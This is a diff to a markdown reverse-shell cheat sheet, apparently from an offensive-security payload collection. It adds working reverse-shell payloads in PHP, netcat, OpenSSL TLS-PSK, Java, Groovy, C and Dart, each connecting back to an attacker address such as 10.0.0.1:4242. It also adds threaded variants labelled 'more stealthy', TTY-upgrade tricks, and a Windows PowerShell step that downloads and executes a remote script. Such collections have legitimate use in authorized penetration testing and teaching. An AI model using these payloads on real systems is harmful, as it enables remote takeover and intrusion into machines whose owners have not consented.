@@ -3,25 +3,31 @@
 ## Summary
 
 * [Reverse Shell](#reverse-shell)
+    * [Awk](#awk)
     * [Bash TCP](#bash-tcp)
     * [Bash UDP](#bash-udp)
-    * [Socat](#socat)
-    * [Perl](#perl)
-    * [Python](#python)
-    * [PHP](#php)
-    * [Ruby](#ruby)
+    * [C](#c)
+    * [Dart](#dart)
     * [Golang](#golang)
-    * [Netcat Traditional](#netcat-traditional)
-    * [Netcat OpenBsd](#netcat-openbsd)
-    * [Ncat](#ncat)
-    * [OpenSSL](#openssl)
-    * [Powershell](#powershell)
-    * [Awk](#awk)
-    * [Java](#java)
-    * [War](#war)
-    * [Lua](#lua)
-    * [NodeJS](#nodejs)
+    * [Groovy Alternative 1](#groovy-alternative-1)
     * [Groovy](#groovy)
+    * [Java Alternative 1](#java-alternative-1)
+    * [Java Alternative 2](#java-alternative-2)
+    * [Java](#java)
+    * [Lua](#lua)
+    * [Ncat](#ncat)
+    * [Netcat OpenBsd](#netcat-openbsd)
+    * [Netcat BusyBox](#netcat-busybox)
+    * [Netcat Traditional](#netcat-traditional)
+    * [NodeJS](#nodejs)
+    * [OpenSSL](#openssl)
+    * [Perl](#perl)
+    * [PHP](#php)
+    * [Powershell](#powershell)
+    * [Python](#python)
+    * [Ruby](#ruby)
+    * [Socat](#socat)
+    * [War](#war)
 * [Meterpreter Shell](#meterpreter-shell)
     * [Windows Staged reverse TCP](#windows-staged-reverse-tcp)
     * [Windows Stageless reverse TCP](#windows-stageless-reverse-tcp)
@@ -50,6 +56,8 @@ sh -i >& /dev/udp/10.0.0.1/4242 0>&1
 Listener:
 nc -u -lvp 4242
 ```
+
+Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash
 
 ### Socat
 
@@ -108,6 +116,11 @@ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('1
 
 ```bash
 php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'
+php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
 ```
 
 ```bash
@@ -145,6 +158,12 @@ nc -c bash 10.0.0.1 4242
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
 ```
 
+### Netcat BusyBox
+
+```bash
+rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+```
+
 ### Ncat
 
 ```bash
@@ -162,6 +181,17 @@ or
 user@attack$ ncat --ssl -vv -l -p 4242
 
 user@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s
+```
+
+TLS-PSK (does not rely on PKI or self-signed certificates)
+```bash
+# generate 384-bit PSK
+# use the generated string as a value for the two PSK variables from below
+openssl rand -hex 48 
+# server (attacker)
+export LHOST="*"; export LPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT
+# client (victim)
+export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE
 ```
 
 ### Powershell
@@ -187,9 +217,32 @@ awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& 
 ### Java
 
 ```java
-r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
-p.waitFor()
+Runtime r = Runtime.getRuntime();
+Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do $line 2>&5 >&5; done'");
+p.waitFor();
+
+```
+
+#### Java Alternative 1
+
+```java
+String host="127.0.0.1";
+int port=4444;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+```
+
+#### Java Alternative 2
+**NOTE**: This is more stealthy
+
+```java
+Thread thread = new Thread(){
+    public void run(){
+        // Reverse shell here
+    }
+}
+thread.start();
 ```
 
 ### War
@@ -250,11 +303,78 @@ https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
 NOTE: Java reverse shell also work for Groovy
 
-```javascript
+```java
 String host="10.0.0.1";
 int port=4242;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
+#### Groovy Alternative 1
+**NOTE**: This is more stealthy
+
+```java
+Thread.start {
+    // Reverse shell here
+}
+```
+
+### C
+
+Compile with `gcc /tmp/shell.c --output csh && csh`
+
+```csharp
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+int main(void){
+    int port = 4242;
+    struct sockaddr_in revsockaddr;
+
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family = AF_INET;       
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr("10.0.0.1");
+
+    connect(sockt, (struct sockaddr *) &revsockaddr, 
+    sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {"/bin/sh", NULL};
+    execve("/bin/sh", argv, NULL);
+
+    return 0;       
+}
+```
+
+### Dart
+
+```java
+import 'dart:io';
+import 'dart:convert';
+
+main() {
+  Socket.connect("10.0.0.1", 4242).then((socket) {
+    socket.listen((data) {
+      Process.start('powershell.exe', []).then((Process process) {
+        process.stdin.writeln(new String.fromCharCodes(data).trim());
+        process.stdout
+          .transform(utf8.decoder)
+          .listen((output) { socket.write(output); });
+      });
+    },
+    onDone: () {
+      socket.destroy();
+    });
+  });
+}
 ```
 
 ## Meterpreter Shell
@@ -344,8 +464,11 @@ Spawn a TTY shell from an interpreter
 ```powershell
 /bin/sh -i
 python3 -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c "__import__('pty').spawn('/bin/bash')"
+python3 -c "__import__('subprocess').call(['/bin/bash'])"
 perl -e 'exec "/bin/sh";'
 perl: exec "/bin/sh";
+perl -e 'print `/bin/bash`'
 ruby: exec "/bin/sh"
 lua: os.execute('/bin/sh')
 ```
@@ -354,6 +477,39 @@ lua: os.execute('/bin/sh')
 - vi: `:set shell=/bin/bash:shell`
 - nmap: `!sh`
 - mysql: `! bash`
+
+Alternative TTY method
+
+```
+www-data@debian:/dev/shm$ su - user
+su: must be run from a terminal
+
+www-data@debian:/dev/shm$ /usr/bin/script -qc /bin/bash /dev/null
+www-data@debian:/dev/shm$ su - user
+Password: P4ssW0rD
+
+user@debian:~$ 
+```
+
+## Fully interactive reverse shell on Windows
+The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.
+
+**ConPtyShell uses the function [CreatePseudoConsole()](https://docs.microsoft.com/en-us/windows/console/createpseudoconsole). This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).**
+
+
+Server Side:
+
+```
+stty raw -echo; (stty size; cat) | nc -lvnp 3001
+```
+
+Client Side:
+
+```
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
+```
+
+Offline version of the ps1 available at --> https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1
 
 ## References
 
